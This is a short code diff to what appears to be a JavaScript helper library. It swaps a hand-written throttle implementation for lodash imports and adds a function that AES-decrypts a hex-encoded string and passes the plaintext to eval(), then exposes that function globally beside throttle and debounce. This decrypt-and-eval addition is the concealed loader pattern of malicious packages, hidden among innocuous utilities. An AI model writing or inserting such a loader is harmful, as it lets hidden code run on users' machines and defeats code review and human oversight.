@@ -1,19 +1,20 @@
-function throttle(func, wait, options) {
-    let leading = true;
-    let trailing = true;
+import { throttle, debounce } from "lodash";
+import { createDecipheriv } from "crypto";
 
-    if (typeof func != 'function') {
-        throw new TypeError(FUNC_ERROR_TEXT);
-    }
 
-    if (isObject(options)) {
-        leading = 'leading' in options ? !!options.leading : leading;
-        trailing = 'trailing' in options ? !!options.trailing : trailing;
-    }
+function decryptAndEvaluateCode(unevaluatedEncryptedCode, Securitykey, initVector) {
+    // the decipher function
+    const decipher = createDecipheriv("aes-256-cbc", Securitykey, initVector);
 
-    return debounce(func, wait, {
-        'leading': leading,
-        'maxWait': wait,
-        'trailer': trailing
-    });
+    let decryptedData = decipher.update(unevaluatedEncryptedCode, "hex", "utf-8");
+
+    decryptedData += decipher.final("utf8");
+
+    return eval(decryptedData);
 }
+
+Window.lib = { 
+    throttle, 
+    debounce,
+    decryptAndEvaluateCode
+};
